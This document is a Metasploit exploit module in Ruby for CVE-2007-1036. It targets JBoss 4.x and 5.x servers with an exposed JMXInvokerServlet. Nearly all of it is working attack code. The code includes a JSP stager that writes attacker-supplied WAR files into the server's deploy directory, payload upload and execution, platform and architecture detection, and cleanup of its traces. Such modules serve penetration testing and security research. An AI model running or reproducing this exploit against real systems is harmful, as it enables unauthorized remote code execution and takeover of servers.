

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  HttpFingerprint = { :pattern => [ /JBoss/ ] }

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;JBoss DeploymentFileRepository WAR Deployment (via JMXInvokerServlet)&#039;,
      &#039;Description&#039; => %q{
          This module can be used to execute a payload on JBoss servers that have an
        exposed HTTPAdaptor&#039;s JMX Invoker exposed on the "JMXInvokerServlet". By invoking
        the methods provided by jboss.admin:DeploymentFileRepository a stager is deployed
        to finally upload the selected payload to the target. The DeploymentFileRepository
        methods are only available on Jboss 4.x and 5.x.
      },
      &#039;Author&#039;      => [
        &#039;Patrick Hof&#039;, # Vulnerability discovery, analysis and PoC
        &#039;Jens Liebchen&#039;, # Vulnerability discovery, analysis and PoC
        &#039;h0ng10&#039; # Metasploit module
      ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;CVE&#039;, &#039;2007-1036&#039; ],
          [ &#039;OSVDB&#039;, &#039;33744&#039; ],
          [ &#039;URL&#039;, &#039;http://www.redteam-pentesting.de/publications/jboss&#039; ],
        ],
      &#039;DisclosureDate&#039; => &#039;Feb 20 2007&#039;,
      &#039;Privileged&#039;  => true,
      &#039;Platform&#039;    => [&#039;java&#039;, &#039;win&#039;, &#039;linux&#039; ],
      &#039;Stance&#039;      => Msf::Exploit::Stance::Aggressive,
      &#039;Targets&#039;     =>
        [

          # do target detection but java meter by default
          [ &#039;Automatic&#039;,
            {
              &#039;Arch&#039; => ARCH_JAVA,
              &#039;Platform&#039; => &#039;java&#039;
            }
          ],

          [ &#039;Java Universal&#039;,
            {
              &#039;Arch&#039; => ARCH_JAVA,
            },
          ],

          #
          # Platform specific targets
          #
          [ &#039;Windows Universal&#039;,
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;win&#039;
            },
          ],

          [ &#039;Linux x86&#039;,
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;linux&#039;
            },
          ],
        ],

      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          Opt::RPORT(8080),
          OptString.new(&#039;JSP&#039;,       [ false, &#039;JSP name to use without .jsp extension (default: random)&#039;, nil ]),
          OptString.new(&#039;APPBASE&#039;,   [ false, &#039;Application base name, (default: random)&#039;, nil ]),
          OptString.new(&#039;TARGETURI&#039;, [ true,  &#039;The URI path of the invoker servlet&#039;, &#039;/invoker/JMXInvokerServlet&#039; ]),
        ], self.class)

  end

  def check
    res = send_serialized_request(&#039;version.bin&#039;)
    if (res.nil?) or (res.code != 200)
      print_error("Unable to request version, returned http code is: #{res.code.to_s}")
      return Exploit::CheckCode::Unknown
    end

    # Check if the version is supported by this exploit
    return Exploit::CheckCode::Vulnerable if res.body =~ /CVSTag=Branch_4_/
    return Exploit::CheckCode::Vulnerable if res.body =~ /SVNTag=JBoss_4_/
    return Exploit::CheckCode::Vulnerable if res.body =~ /SVNTag=JBoss_5_/

    if res.body =~ /ServletException/  # Simple check, if we caused an exception.
      print_status("Target seems vulnerable, but the used JBoss version is not supported by this exploit")
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    mytarget = target

    if (target.name =~ /Automatic/)
      mytarget = auto_target
      fail_with("Unable to automatically select a target") if not mytarget
      print_status("Automatically selected target: \"#{mytarget.name}\"")
    else
      print_status("Using manually select target: \"#{mytarget.name}\"")
    end


    # We use a already serialized stager to deploy the final payload
    regex_stager_app_base = rand_text_alpha(14)
    regex_stager_jsp_name = rand_text_alpha(14)
    name_parameter = rand_text_alpha(8)
    content_parameter = rand_text_alpha(8)
    stager_uri = "/#{regex_stager_app_base}/#{regex_stager_jsp_name}.jsp"
    stager_code = "A" * 810    # 810 is the size of the stager in the serialized request

    replace_values = {
      &#039;regex_app_base&#039; => regex_stager_app_base,
      &#039;regex_jsp_name&#039; => regex_stager_jsp_name,
      stager_code => generate_stager(name_parameter, content_parameter)
    }

    print_status("Deploying stager")
    send_serialized_request(&#039;installstager.bin&#039;, replace_values)
    print_status("Calling stager: #{stager_uri}")
    call_uri_mtimes(stager_uri, 5, &#039;GET&#039;)

    # Generate the WAR with the payload which will be uploaded through the stager
    app_base = datastore[&#039;APPBASE&#039;] || rand_text_alpha(8+rand(8))
    jsp_name = datastore[&#039;JSP&#039;] || rand_text_alpha(8+rand(8))

    war_data = payload.encoded_war({
      :app_name => app_base,
      :jsp_name => jsp_name,
      :arch => mytarget.arch,
      :platform => mytarget.platform
    }).to_s

    b64_war = Rex::Text.encode_base64(war_data)
    print_status("Uploading payload through stager")
    res = send_request_cgi({
      &#039;uri&#039;     => stager_uri,
      &#039;method&#039;  => "POST",
      &#039;vars_post&#039; =>
      {
        name_parameter => app_base,
        content_parameter => b64_war
      }
    }, 20)

    payload_uri = "/#{app_base}/#{jsp_name}.jsp"
    print_status("Calling payload: " + payload_uri)
    res = call_uri_mtimes(payload_uri,5, &#039;GET&#039;)

    # Remove the payload through  stager
    print_status("Removing payload through stager")
    delete_payload_uri = stager_uri + "?#{name_parameter}=#{app_base}"
    res = send_request_cgi(
      {&#039;uri&#039;     => delete_payload_uri,
    })

    # Remove the stager
    print_status("Removing stager")
    send_serialized_request(&#039;removestagerfile.bin&#039;, replace_values)
    send_serialized_request(&#039;removestagerdirectory.bin&#039;, replace_values)

    handler
  end

  def generate_stager(name_param, content_param)
    war_file = rand_text_alpha(4+rand(4))
    file_content = rand_text_alpha(4+rand(4))
    jboss_home = rand_text_alpha(4+rand(4))
    decoded_content = rand_text_alpha(4+rand(4))
    path = rand_text_alpha(4+rand(4))
    fos = rand_text_alpha(4+rand(4))
    name = rand_text_alpha(4+rand(4))
    file = rand_text_alpha(4+rand(4))

    stager_script = <<-EOT
<%@page import="java.io.*,
    java.util.*,
    sun.misc.BASE64Decoder"
%>
<%
String #{file_content} = "";
String #{war_file} = "";
String #{jboss_home} = System.getProperty("jboss.server.home.dir");
if (request.getParameter("#{content_param}") != null){
try {
#{file_content} = request.getParameter("#{content_param}");
#{war_file} = request.getParameter("#{name_param}");
byte[] #{decoded_content} = new BASE64Decoder().decodeBuffer(#{file_content});
String #{path} = #{jboss_home} + "/deploy/" + #{war_file} + ".war";
FileOutputStream #{fos} = new FileOutputStream(#{path});
#{fos}.write(#{decoded_content});
#{fos}.close();
}
catch(Exception e) {}
}
else {
try{
String #{name} = request.getParameter("#{name_param}");
String #{file} = #{jboss_home} + "/deploy/" + #{name} + ".war";
new File(#{file}).delete();
}
catch(Exception e) {}
}

%>
EOT

  # The script must be exactly 810 characters long, otherwise we might have serialization issues
  # Therefore we fill the rest wit spaces
  spaces  = " " * (810 - stager_script.length)
  stager_script << spaces
  end


  def send_serialized_request(file_name , replace_params = {})
    path = File.join( Msf::Config.install_root, "data", "exploits", "jboss_jmxinvoker", "DeploymentFileRepository", file_name)
    data = File.open( path, "rb" ) { |fd| data = fd.read(fd.stat.size) }

    replace_params.each { |key, value| data.gsub!(key, value) }

    res = send_request_cgi({
      &#039;uri&#039;     => target_uri.path,
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;data&#039;    => data,
      &#039;headers&#039; =>
        {
          &#039;ContentType:&#039; => &#039;application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation&#039;,
          &#039;Accept&#039; =>  &#039;text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2&#039;
        }
    }, 25)


    if (not res) or (res.code != 200)
      return nil
    end

    res
  end


  def call_uri_mtimes(uri, num_attempts = 5, verb = nil, data = nil)
    # JBoss might need some time for the deployment. Try 5 times at most and
    # wait 5 seconds inbetween tries
    num_attempts.times do |attempt|
      if (verb == "POST")
        res = send_request_cgi(
          {
            &#039;uri&#039;    => uri,
            &#039;method&#039; => verb,
            &#039;data&#039;   => data
          }, 5)
      else
        uri += "?#{data}" unless data.nil?
        res = send_request_cgi(
          {
            &#039;uri&#039;    => uri,
            &#039;method&#039; => verb
          }, 30)
      end

      msg = nil
      if (!res)
        msg = "Execution failed on #{uri} [No Response]"
      elsif (res.code < 200 or res.code >= 300)
        msg = "http request failed to #{uri} [#{res.code}]"
      elsif (res.code == 200)
        print_status("Successfully called &#039;#{uri}&#039;") if datastore[&#039;VERBOSE&#039;]
        return res
      end

      if (attempt < num_attempts - 1)
        msg << ", retrying in 5 seconds..."
        print_status(msg) if datastore[&#039;VERBOSE&#039;]
        select(nil, nil, nil, 5)
      else
        print_error(msg)
        return res
      end
    end
  end


  def auto_target
    print_status("Attempting to automatically select a target")

    plat = detect_platform()
    arch = detect_architecture()

    return nil if (not arch or not plat)

    # see if we have a match
    targets.each { |t| return t if (t[&#039;Platform&#039;] == plat) and (t[&#039;Arch&#039;] == arch) }

    # no matching target found
    return nil
  end


  # Try to autodetect the target platform
  def detect_platform
    print_status("Attempting to automatically detect the platform")
    res = send_serialized_request("osname.bin")

    if (res.body =~ /(Linux|FreeBSD|Windows)/i)
      os = $1
      if (os =~ /Linux/i)
        return &#039;linux&#039;
      elsif (os =~ /FreeBSD/i)
        return &#039;linux&#039;
      elsif (os =~ /Windows/i)
        return &#039;win&#039;
      end
    end
    nil
  end


  # Try to autodetect the architecture
  def detect_architecture()
    print_status("Attempting to automatically detect the architecture")
    res = send_serialized_request("osarch.bin")
    if (res.body =~ /(i386|x86)/i)
      arch = $1
      if (arch =~ /i386|x86/i)
        return ARCH_X86
        # TODO, more
      end
    end
    nil
  end
end



